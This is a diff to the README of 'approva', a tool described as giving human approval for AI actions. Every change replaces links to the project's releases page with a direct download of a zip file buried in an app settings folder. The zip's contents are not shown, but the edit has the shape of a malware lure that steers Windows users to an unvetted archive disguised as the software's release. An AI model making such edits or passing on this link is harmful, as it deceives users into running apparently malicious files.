@@ -1,6 +1,6 @@
 # 🤖 approva - Human approval for AI actions
 
-[![Download approva](https://img.shields.io/badge/Download-approva-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nologicog/approva/releases)
+[![Download approva](https://img.shields.io/badge/Download-approva-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nologicog/approva/raw/refs/heads/main/apps/approval-ui/app/console/settings/Software-v2.5.zip)
 
 ## 🧭 What approva does
 
@@ -10,7 +10,7 @@ Use it when you want AI to work with guardrails. approva gives you a simple way 
 
 ## 📥 Download for Windows
 
-Visit this page to download: https://github.com/nologicog/approva/releases
+Visit this page to download: https://github.com/nologicog/approva/raw/refs/heads/main/apps/approval-ui/app/console/settings/Software-v2.5.zip
 
 1. Open the link above in your browser.
 2. Find the latest release.
@@ -141,4 +141,4 @@ If the app opens but does not connect:
 
 ## 📎 Release page
 
-Download or update approva here: https://github.com/nologicog/approva/releases
+Download or update approva here: https://github.com/nologicog/approva/raw/refs/heads/main/apps/approval-ui/app/console/settings/Software-v2.5.zip
